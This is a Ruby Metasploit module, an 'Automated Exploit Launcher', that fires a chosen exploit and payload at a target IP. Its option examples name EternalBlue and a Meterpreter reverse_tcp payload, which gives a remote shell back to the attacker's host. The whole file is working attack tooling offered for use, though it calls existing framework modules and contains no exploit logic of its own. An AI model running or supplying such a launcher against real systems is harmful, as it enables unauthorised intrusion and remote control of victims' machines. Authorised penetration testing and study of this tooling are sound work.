require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(info,
        'Name'        => 'Automated Exploit Launcher',
        'Description' => 'Automatically launches a specified exploit with a payload against a target',
        'Author'      => ['YourName'],
        'License'     => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('RHOST', [true, 'The target IP address']),
        OptString.new('EXPLOIT', [true, 'The exploit module name (e.g., windows/smb/ms17_010_eternalblue)']),
        OptString.new('PAYLOAD', [true, 'The payload module name (e.g., windows/x64/meterpreter/reverse_tcp)']),
        OptString.new('LHOST', [true, 'Your local IP address']),
        OptInt.new('LPORT', [true, 'Your local port', 4444])
      ]
    )
  end

  def run
    rhost   = datastore['RHOST']
    exploit_path = datastore['EXPLOIT']
    payload_path = datastore['PAYLOAD']
    lhost   = datastore['LHOST']
    lport   = datastore['LPORT']

    print_status("Launching exploit #{exploit_path} against #{rhost} with payload #{payload_path}")

    exploit = framework.exploits.create(exploit_path)
    if exploit.nil?
      print_error("Exploit module not found: #{exploit_path}")
      return
    end

    payload = framework.payloads.create(payload_path)
    if payload.nil?
      print_error("Payload module not found: #{payload_path}")
      return
    end

    # Configure payload options
    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    # Configure exploit options
    exploit.datastore['RHOST'] = rhost
    exploit.datastore['PAYLOAD'] = payload_path
    exploit.datastore['LHOST'] = lhost
    exploit.datastore['LPORT'] = lport

    begin
      exploit.exploit_simple(
        'Payload'     => payload,
        'LocalInput'  => self.user_input,
        'LocalOutput' => self.user_output
      )
    rescue => e
      print_error("Exploit failed: #{e}")
    end
  end
end
